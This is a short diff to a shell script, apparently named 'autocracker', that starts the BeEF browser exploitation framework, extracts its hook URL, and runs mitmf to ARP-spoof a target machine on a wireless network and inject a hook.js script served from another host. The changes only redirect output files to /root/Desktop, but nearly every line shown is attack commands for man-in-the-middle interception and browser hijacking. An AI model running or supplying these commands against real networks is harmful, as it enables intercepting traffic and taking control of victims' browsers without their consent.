@@ -81,12 +81,12 @@ echo "$s"
 
 
 echo "beef"
-/usr/share/beef-xss/beef > boutput.txt
+cd /usr/share/beef-xss; ./beef > /root/Desktop/boutput.txt
 
 #parse obutput.txt
 r=Hook 
 wait
-cat ./boutput.txt | while read i
+cat /root/Desktop/boutput.txt | while read i
 do 
 if [ ! "${i/$r}" = "$i" ] ; then
 #the second echo is our hook url
@@ -95,7 +95,7 @@ fi
 done
 
 #here we would pass our site/target to mitmf
-mitmf --spoof --arp -i wlan0 --gateway 10.0.2.1 --target 10.0.2.236 --inject --js-url http://10.0.2.15:3000/hook.js > moutput.txt
+mitmf --spoof --arp -i wlan0 --gateway 10.0.2.1 --target 10.0.2.236 --inject --js-url http://10.0.2.15:3000/hook.js > /root/Desktop/moutput.txt
 
 #possibly we parse the output of moutput.txt?
 
@@ -112,4 +112,3 @@ fi
 
 echo "autocracker done"
 #do stuff
-
